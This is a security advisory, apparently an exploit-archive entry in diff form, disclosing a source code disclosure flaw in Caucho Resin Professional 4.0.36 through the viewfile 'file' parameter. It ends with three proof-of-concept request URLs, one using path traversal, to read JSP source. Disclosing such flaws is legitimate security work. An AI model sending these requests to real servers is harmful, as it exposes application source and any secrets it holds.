@@ -1,0 +1,39 @@
+Resin Application Server 4.0.36 Source Code Disclosure Vulnerability
+
+
+Vendor: Caucho Technology, Inc.
+Product web page: http://www.caucho.com
+Affected version: Resin Professional Web And Application Server 4.0.36
+
+Summary: Resin is the Java Application Server for high traffic
+sites that require speed and scalability. It is one of the earliest
+Java Application Servers, and has stood the test of time due to
+engineering prowess.
+
+Desc: The vulnerability is caused do to an improper sanitization
+of the 'file' parameter when used for reading help files. An
+attacker can exploit this vulnerability by directly requesting
+a '.jsp' file for example in the root directory of the server
+to view its source code that might reveal sensitive information.
+
+Tested on: Resin Professional 4.0.36 (built Fri, 26 Apr 2013 03:33:09 PDT)
+           Java HotSpot(TM) 64-Bit Server VM 23.3-b01
+           4 cpu, Windows 7 amd64 6.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2013-5144
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5144.php
+
+
+01.06.2013
+
+--
+
+
+http://127.0.0.1:8080/resin-doc/viewfile/?file=index.jsp
+http://127.0.0.1:8080/resin-doc/viewfile/?contextpath=/.\../&servletpath=&file=index.jsp
+http://127.0.0.1:8080/resin-doc/viewfile/?contextpath=/.&servletpath=&file=index.jsp
